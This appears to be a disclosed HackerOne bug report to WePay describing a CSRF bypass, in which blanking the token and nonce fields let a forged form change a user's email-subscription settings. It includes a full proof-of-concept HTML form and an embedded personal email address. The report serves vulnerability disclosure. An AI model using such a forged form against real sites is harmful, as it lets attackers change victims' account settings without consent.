@@ -1,0 +1,87 @@
+ReportLink:https://hackerone.com/reports/14751
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/coolboss
+ReportedTo:WePay(wepay)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:23.08.2014 7:20:06
+
+Summary:
+
+See the form you give here.
+This is provided by you to change settings without logging in.
+You have supplied a 'csrf token' and 'ounce'.
+
+
+eg. https://stage.wepay.com/email/manage/170395/[hash]
+
+But, i bypassed your csrf by just removing values of tokens and submitting it blank.
+And it worked.
+
+Hope, you patch it.
+
+POC form ...
+
+<form class="weform label-top" action="https://stage.wepay.com/email/manage/170395/[hash]" method="post">
+	<div id="email-manage" class="weform-section">
+				<dl class="weform-row">
+			<dd class="weform-input email-option">
+				<div class="email-option-description">
+				These are very important messages that need to be delivered to you in order for your profile to function properly. 
+				These include things like password resets/reminders, email confirmation, and other security related messages. 
+				You cannot unsubscribe from these messages without deleting your profile.
+				</div>
+				<input id="status_system_msgs" class="checkbox" name="status_system_msgs" value="1" type="checkbox" checked="" disabled="">
+				<label for="status_system_msgs">System Messages</label>
+				<div class="footer">(Required, cannot unsubscribe)</div>
+			</dd>
+		</dl>
+		<dl class="weform-row">
+			<dd class="weform-input email-option">
+				<input id="status_account_msgs" class="checkbox" name="status_account_msgs" value="1" type="checkbox" checked="">
+				<label for="status_account_msgs">Account Messages</label>
+				<div class="email-option-description">
+				These are important messages pertaining to your accounts and your profile.  These include things like 
+				payment confirmations, reminders, issues needing attention, and other important issues about your accounts.  
+				We recommend you stay subscribed to this so you don't miss a payment.
+				</div>
+			</dd>
+		</dl>
+		<dl class="weform-row">
+			<dd class="weform-input email-option">
+				<input id="status_activity_msgs" class="checkbox" name="status_activity_msgs" value="1" type="checkbox" checked="">
+				<label for="status_activity_msgs">Activity Messages</label>
+				<div class="email-option-description">
+				These messages relate to your WePay Account and Payment Account activity. These include things like Account invites.
+				</div>
+			</dd>
+		</dl>
+		<dl class="weform-row">
+			<dd class="weform-input email-option">
+				<input id="status_digest_msgs" class="checkbox" name="status_digest_msgs" value="1" type="checkbox">
+				<label for="status_digest_msgs">Periodic Digests</label>
+				<div class="email-option-description">
+				We'll send out digests periodically to keep you updated on your accounts.  Usually you'll find snapshots of your profile and accounts
+				with summaries of payments and related activities.  Subscribing to these is a great way to stay on top of your accounts.
+				</div>
+			</dd>
+		</dl>
+				<dl class="weform-row">
+			<dd class="weform-input email-option">
+				<input id="status_marketing_msgs" class="checkbox" name="status_marketing_msgs" value="1" type="checkbox">
+				<label for="status_marketing_msgs">Newsletters and Marketing</label>
+				<div class="email-option-description">
+				On occasion, we'll send out WePay-related announcements about things such as newly released features, helpful articles, 
+				special promotions, and other things we think will improve your WePay experience.
+				</div>
+			</dd>
+		</dl>
+	</div>
+	<div class="weform-actions">
+		<input id="field1" class="submit button" type="submit" alt="Update" value="Update">	</div>
+	<input type="hidden" name="email" value="aish_chopra@yahoo.com">	<input type="hidden" name="action" value="update">	<input type="hidden" name="csrf" value=""><input type="hidden" name="nonce" value=""></form>
+
+This works ...!
+
+Hope you patch it soon ...! :)
